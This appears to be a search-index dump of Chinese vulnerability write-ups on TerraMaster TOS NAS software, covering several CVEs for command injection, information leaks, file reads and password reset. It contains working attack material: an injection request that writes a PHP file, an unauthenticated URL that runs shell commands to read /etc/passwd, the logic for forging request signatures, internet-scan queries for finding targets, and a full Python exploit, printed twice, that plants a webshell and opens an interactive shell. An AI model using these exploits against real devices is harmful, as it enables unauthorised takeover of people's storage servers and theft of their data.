","date":"0001-01-01","objectID":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/:1:0","tags":null,"title":"","uri":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.31 ","date":"0001-01-01","objectID":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/:2:0","tags":null,"title":"","uri":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/:3:0","tags":null,"title":"","uri":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/"},{"categories":null,"content":"漏洞复现 登录页面 查看 mobile.class.php文件中的 createRaid方法, 其中参数raidtype和参数diskstring均为可控参数 注意这一行代码并跟踪 volume_make_from_disks 方法 $ret = $vol-\u003evolume_make_from_disks($this-\u003ein['raidtype'], $filesystem, $disks, $volume_size); 可以看到方法调用中的 $levek 参数是可控参数，传入 _backexec方法中，可导致命令拼接执行恶意命令 回到 mobile.class.php 文件开头的定义 static $notCheck = [ \"webNasIPS\", \"getDiskList\", \"createRaid\", \"getInstallStat\", \"getIsConfigAdmin\", \"setAdminConfig\", \"isConnected\",'createid', 'user_create','user_bond','user_release','login', 'logout', 'checkCode', \"wapNasIPS\" ]; //不验证头信息是否匹配... static $notHeader = [\"fileDownload\", \"videoPlay\", \"imagesThumb\", \"imagesView\", \"fileUpload\", \"tempClear\", \"wapNasIPS\", \"webNasIPS\", \"isConnected\"]; private static $U = null; private static $filter = array(\".\", \"..\", \".svn\", \"lost+found\", \"aquota.group\", \"aquota.user\"); 发现 $notHeader 数组中并不存在方法名 createRaid，看一下 api.php 中的定义 $instance = new $class(); if (!in_array($function, $class::$notHeader)) { #防止请求重放验证... if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] \u003e 300) { $instance-\u003eoutput(\"Illegal request, timeout!\", 0); } } $instance-\u003e$function(); 由于实例化的过程中存在验证请求头，所以需要通过if判断才能调用该方法进行命令执行 if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] \u003e 300) { $instance-\u003eoutput(\"Illegal request, timeout!\", 0); } 看到这里主要是两个参数值得关注: HTTP_TIMESTAMP 和 HTTP_SIGNATURE 跟踪方法 tos_encrypt_str 在源码中并没有找到，我们查看下php扩展函数列表 下载这个 so文件使用 IDA打开 搜索字符串 tos_encrypt_str 跟进方法 get_mac_addr 这里可以看到获取 eth0网卡的 mac，再经过 php_sprintf， 跟进下 \u0026ubk_38fa 实际上就是获取了 mac的最后3个字节, 例如mac地址为: 11.22.33.44.55.66, 经过后获取为 445566 回到函数执行的地方，我们就可以知道，实际上这个函数等同于 # mac addr 11:22:33:44:55:66 tos_encrypt_str(xxxxxx) = md5(445566xxxxxx) 看看之前的判断代码 $instance = new $class(); if (!in_array($function, $class::$notHeader)) { #防止请求重放验证... if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] \u003e 300) { $instance-\u003eoutput(\"Illegal request, timeout!\", 0); } } $instance-\u003e$function(); TIMESTAMP参数为当前时间戳，这里的判断逻辑就很清楚了 md5(mac地址后三字节 + 当前时间戳) = $_SERVER['HTTP_SIGNATURE'] 通过之前提到的漏洞 CVE-2022-24990 泄漏的 PWD和mac地址，我们就可以利用这个命令执行漏洞了, 通过刚刚的逻辑写POC获取信息 在发送请求包写入 php恶意文件 POST /module/api.php?mobile/createRaid HTTP/1.1 Host: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Authorization: $1$hq6UR8XW$ti.QT5f9wQQg1PcJFWdub/ Cache-Control: max-age=0 Content-Length: 82 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID=f1d33267c0ee0c34e9a348402205e272; tos_visit_time=1647670158 Signature: e856010781d0efd904d57ac40517859c Timestamp: 1647678138 Upgrade-Insecure-Requests: 1 User-Agent: TNAS raidtype=%3Becho+%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3Evuln.php\u0026diskstring=XXXX 访问写入的文件 ","date":"0001-01-01","objectID":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/:4:0","tags":null,"title":"","uri":"/terramaster-tos-createraid-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24989/"},{"categories":null,"content":"TerraMaster TOS exportUser.php 远程命令执行 ","date":"0001-01-01","objectID":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS exportUser.php 文件中存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.1.24 ","date":"0001-01-01","objectID":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件 exportUser.php \u003c?php include_once \"./app.php\"; // [1] autoload classes class CSV_Writer{ ... } $type = $_GET['type']; $csv = new CSV_Writer(); if($type == 1){ $P = new person(); $data = $P-\u003eexport_user($_GET['data']); $csv-\u003eexportUser($data); } else if($type == 2) { $P = new person(); $data = $P-\u003eexport_userGroup($_GET['data']); $csv-\u003eexportUsergroup($data); } else { // [2] type value is bigger than 2 //xlsx通用下载 $type = 0; $class = $_GET['cla']; $fun = $_GET['func']; $opt = $_GET['opt']; $E = new $class(); $data = $E-\u003e$fun($opt); // [3] vulnerable code call $csv-\u003eexportExcel( $data['title'], $data['data'], $data['name'], $data['save'], $data['down']); } ?\u003e 在其他文件的代码检查期间，也发现有一种方法可以利用TOS软件中预先存在的类来利用此问题。 位于include/class/application.class.php中的PHP类是在运行TOS软件的设备上执行命令的最佳人选。 由于exportUser.php没有身份验证控件，因此未经身份验证的攻击者有可能通过提供以下值作为HTTP GET参数来实现代码执行。 http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3\u0026cla=application\u0026func=_exec\u0026opt=(cat%20/etc/passwd)\u003etest.txt 返回200后再次访问 http://xxx.xxx.xxx.xxx/include/test.txt ","date":"0001-01-01","objectID":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:4:0","tags":null,"title":"","uri":"/terramaster-tos-exportuser.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"TerraMaster TOS makecvs.php 远程命令执行漏洞 CVE-2020-28188 ","date":"0001-01-01","objectID":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/:0:0","tags":null,"title":"","uri":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS 4.2.06 以下中 makecvs.php 存在任意文件写入，攻击者可以上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/:1:0","tags":null,"title":"","uri":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.06 ","date":"0001-01-01","objectID":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/:2:0","tags":null,"title":"","uri":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/:3:0","tags":null,"title":"","uri":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的为 /include/makecvs.php 中的Event参数 使用EXP文件上传并执行命令 ","date":"0001-01-01","objectID":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/:4:0","tags":null,"title":"","uri":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/"},{"categories":null,"content":"漏洞POC # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) # Date: 12/12/2020 # Exploit Author: IHTeam # Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ # Vendor Homepage: https://www.terra-master.com/ # Version: \u003c= 4.2.06 # Tested on: 4.1.30, 4.2.06 #!/usr/bin/env python3 import argparse import requests import time import sys import urllib.parse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) parser = argparse.ArgumentParser(description=\"TerraMaster TOS \u003c= 4.2.06 Unauth RCE\") parser.add_argument('--url', action='store', dest='url', required=True, help=\"Full URL and port e.g.: http://192.168.1.111:8081/\") args = parser.parse_args() url = args.url headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'} epoch_time = int(time.time()) shell_filename = \"debug\"+str(epoch_time)+\".php\" def check_endpoint(url, headers): response = requests.get(url+'/version', headers=headers, verify=False) if response.status_code == 200: print(\"[+] TerraMaster TOS version: \", str(response.content)) else: print(\"\\n[-] TerraMaster TOS response code: \", response.status_code) sys.exit() def upload_shell(url, headers, shell_filename): payload = \"http|echo \\\"\u003c?php echo(passthru(\\\\$_GET['cmd']));?\u003e\\\" \u003e\u003e /usr/www/\"+shell_filename+\" \u0026\u0026 chmod +x /usr/www/\"+shell_filename+\"||\" payload = urllib.parse.quote(payload, safe='') print(\"[/] Uploading shell...\") response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False) time.sleep(1) response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False) if ('root:' in str(response.content, 'utf-8')): print(\"[+] Upload succeeded\") else: print(\"\\n[-] Error uploading shell: \", response.content) sys.exit() def interactive_shell(url, headers, shell_filename, cmd): response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False) print(str(response.text)+\"\\n\") def delete_shell(url, headers, shell_filename): delcmd = \"rm /usr/www/\"+shell_filename response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False) print(\"\\n[+] Shell deleted\") upload_shell(url, headers, shell_filename) try: while True: cmd = input(\"# \") interactive_shell(url, headers, shell_filename, cmd) except: delete_shell(url, headers, shell_filename) ","date":"0001-01-01","objectID":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/:5:0","tags":null,"title":"","uri":"/terramaster-tos-makecvs.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-28188/"},{"categories":null,"content":"TerraMaster TOS RCE CVE-2020-28188 ","date":"0001-01-01","objectID":"/terramaster-tos-rce-cve-2020-28188/:0:0","tags":null,"title":"","uri":"/terramaster-tos-rce-cve-2020-28188/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS 4.2.06 以下中 makecvs.php 存在任意文件写入，攻击者可以上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/terramaster-tos-rce-cve-2020-28188/:1:0","tags":null,"title":"","uri":"/terramaster-tos-rce-cve-2020-28188/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.06 ","date":"0001-01-01","objectID":"/terramaster-tos-rce-cve-2020-28188/:2:0","tags":null,"title":"","uri":"/terramaster-tos-rce-cve-2020-28188/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-rce-cve-2020-28188/:3:0","tags":null,"title":"","uri":"/terramaster-tos-rce-cve-2020-28188/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的为 /include/makecvs.php 中的Event参数 使用EXP文件上传并执行命令 ","date":"0001-01-01","objectID":"/terramaster-tos-rce-cve-2020-28188/:4:0","tags":null,"title":"","uri":"/terramaster-tos-rce-cve-2020-28188/"},{"categories":null,"content":"漏洞POC # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) # Date: 12/12/2020 # Exploit Author: IHTeam # Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ # Vendor Homepage: https://www.terra-master.com/ # Version: \u003c= 4.2.06 # Tested on: 4.1.30, 4.2.06 #!/usr/bin/env python3 import argparse import requests import time import sys import urllib.parse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) parser = argparse.ArgumentParser(description=\"TerraMaster TOS \u003c= 4.2.06 Unauth RCE\") parser.add_argument('--url', action='store', dest='url', required=True, help=\"Full URL and port e.g.: http://192.168.1.111:8081/\") args = parser.parse_args() url = args.url headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'} epoch_time = int(time.time()) shell_filename = \"debug\"+str(epoch_time)+\".php\" def check_endpoint(url, headers): response = requests.get(url+'/version', headers=headers, verify=False) if response.status_code == 200: print(\"[+] TerraMaster TOS version: \", str(response.content)) else: print(\"\\n[-] TerraMaster TOS response code: \", response.status_code) sys.exit() def upload_shell(url, headers, shell_filename): payload = \"http|echo \\\"\u003c?php echo(passthru(\\\\$_GET['cmd']));?\u003e\\\" \u003e\u003e /usr/www/\"+shell_filename+\" \u0026\u0026 chmod +x /usr/www/\"+shell_filename+\"||\" payload = urllib.parse.quote(payload, safe='') print(\"[/] Uploading shell...\") response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False) time.sleep(1) response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False) if ('root:' in str(response.content, 'utf-8')): print(\"[+] Upload succeeded\") else: print(\"\\n[-] Error uploading shell: \", response.content) sys.exit() def interactive_shell(url, headers, shell_filename, cmd): response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False) print(str(response.text)+\"\\n\") def delete_shell(url, headers, shell_filename): delcmd = \"rm /usr/www/\"+shell_filename response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False) print(\"\\n[+] Shell deleted\") upload_shell(url, headers, shell_filename) try: while True: cmd = input(\"# \") interactive_shell(url, headers, shell_filename, cmd) except: delete_shell(url, headers, shell_filename) ","date":"0001-01-01","objectID":"/terramaster-tos-rce-cve-2020-28188/:5:0","tags":null,"title":"","uri":"/terramaster-tos-rce-cve-2020-28188/"},{"categories":null,"content":"TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/:0:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS \u003c= 4.2.06中的电子邮件注入允许未经身份验证的远程攻击者利用忘记密码功能，重置账号密码实现账号接管。 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/:1:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.06 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/:2:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/"},{"categories":null,"content":"网络测绘 “TerraMaster” \u0026\u0026 header=“TOS” ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/:3:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/"},{"categories":null,"content":"漏洞复现 首先需要知道已知用户名，可以参考 TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 获取已知的用户名 重置页面输入获取的账号和邮箱 点击确定，抓包更换邮箱接收验证码 通过接收的验证码即可更换账号密码登录后台 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/:4:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E-cve-2020-28186/"},{"categories":null,"content":"TerraMaster TOS 信息泄漏漏洞 CVE-2022-24990 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/:0:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS 存在信息泄漏漏洞，攻击者通过漏洞可以获取服务器上的敏感信息，配合 CVE-2022-24989漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/:1:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.31 ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/:2:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/"},{"categories":null,"content":"网络测绘 \"TerraMaster\" \u0026\u0026 header=\"TOS\" ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/:3:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/"},{"categories":null,"content":"漏洞复现 登录页面 根据POC我们看到 api.php 文件 # 例如下列的Url调用那么$class将是 class，并且$function 是 func。 /module/api.php?class/func 我们注意看这几个位置，这里首先定义了一个方法数组, 然后再通过判断调用的方法是否存在这个数组里来定义 REQUEST_MODE参数的值 $GLOBALS['NO_LOGIN_CHECK'] = array(\"webNasIPS\", \"getDiskList\", \"createRaid\", \"getInstallStat\", \"getIsConfigAdmin\", \"setAdminConfig\", \"isConnected\"); if (!in_array($function, $GLOBALS['NO_LOGIN_CHECK'])) { define('REQUEST_MODE', 1); //加载原始session if (isset($in['PHPSESSID']) \u0026\u0026 !empty($in['PHPSESSID'])) { session_id($in['PHPSESSID']); $GLOBALS['sessionid'] = $in['PHPSESSID']; } @session_start(); @session_write_close(); //初始化阵列 $raid = new raid(); $base_md = $raid-\u003e_main_disk(); if (!empty($base_md)) { define('DATA_BASE', \"$base_md/\"); } else { define('DATA_BASE', null); } define('USER_PATH', DATA_BASE . \"User/\"); //用户目录 define('PUBLIC_PATH', DATA_BASE . \"public/\"); //公共目录 define('DATA_THUMB', DATA_BASE . '@system/thumb/');//缩略图生成存放 } else { define('REQUEST_MODE', 0); } 走完判断代码后就会实例化 所声明的类$class并调用所声明的方法$function。 $instance = new $class(); if (!in_array($function, $class::$notHeader)) { #防止请求重放验证... if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] \u003e 300) { $instance-\u003eoutput(\"Illegal request, timeout!\", 0); } } $instance-\u003e$function(); 我们再来到漏洞出现的文件 include/class/mobile.class.php 构造函数中有几个关键的判断 function __construct() { parent::__construct(); $this-\u003estart = $this-\u003emtime(); if ($_SERVER['HTTP_USER_DEVICE'] == \"TNAS\"){ $_SERVER['HTTP_USER_AGENT'] = \"TNAS\"; } if (!in_array(Action, self::$notHeader)) { if (!strstr($_SERVER['HTTP_USER_AGENT'], \"TNAS\") || !isset($_SERVER['HTTP_AUTHORIZATION'])) { if($this-\u003eREQUESTCODE != $_SERVER['HTTP_AUTHORIZATION'] \u0026\u0026 hash(\"sha256\", $this-\u003eREQUESTCODE) != $_SERVER['HTTP_AUTHORIZATION']) { $this-\u003eoutput(\"Illegal request, please use genuine software!\", false); } } } if (REQUEST_MODE) { if (DATA_BASE == null) { $this-\u003eoutput(\"main raid not exists\", false); } //避免session不可写导致循环跳转 if (!isset($_SESSION)) { $this-\u003eoutput(\"session write error!\", false); } else { $this-\u003euser = \u0026$_SESSION['kod_user']; } if (isset($this-\u003ein['PHPSESSID'])) { $this-\u003esessionid = $this-\u003ein['PHPSESSID']; } #管理员接口 if (in_array(Action, $this-\u003enoPermission)) { if ($this-\u003euser['role'] != \"root\") { $this-\u003eoutput(\"User [{$this-\u003euser['name']}] does not have permission!\", false); } } } if (!in_array(Action, self::$notCheck)) { if (!$this-\u003eloginCheck()) { $this-\u003eoutput(\"login is timeout\", 0); } } //初始化 if (self::$U == null) self::$U = new person(); if (self::$U-\u003edeamon()) { $this-\u003eoutput(\"user hasn't permission!\", true, 0); } } 第一个判断了调用的方法名称是否在$notHeader数组中，它会测试用户代理 http 标头是否为 ‘TNAS’ 并且 AUTHORIZATION 标头是否等于$this-\u003eREQUESTCODE。否则它会退出并显示错误消息 第二个判断了调用的方法是否存在于不需要登录的方法 if (!in_array(Action, self::$notCheck)) { if (!$this-\u003eloginCheck()) { $this-\u003eoutput(\"login is timeout\", 0); } } 接着看下 webNasIPS 调用的定义 可以发现这个方法均存在于这些判断数组中，我们跟踪到这个方法 可以发现这个方法的调用只需要添加 User-Agent: TNAS, 我们就可以调用这个方法来获取服务器中敏感信息 /module/api.php?mobile/webNasIPS ","date":"0001-01-01","objectID":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/:4:0","tags":null,"title":"","uri":"/terramaster-tos-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-24990/"},{"categories":null,"content":"TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187 ","date":"0001-01-01","objectID":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/:0:0","tags":null,"title":"","uri":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/"},{"categories":null,"content":"漏洞描述 TerraMaster TOS \u003c= 4.2.06中的多个目录遍历漏洞允许远程身份验证的攻击者通过/tos/index.php?editor/fileGet路径下的filename参数、 /include/ajax/logtable.php路径下的Event参数和/include/core/index.php路径下的opt参数，读取文件系统中的任何文件。 ","date":"0001-01-01","objectID":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/:1:0","tags":null,"title":"","uri":"/terramaster-tos-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2020-28187/"},{"categories":null,"content":"漏洞影响 TerraMaster TOS \u003c 4.2.06 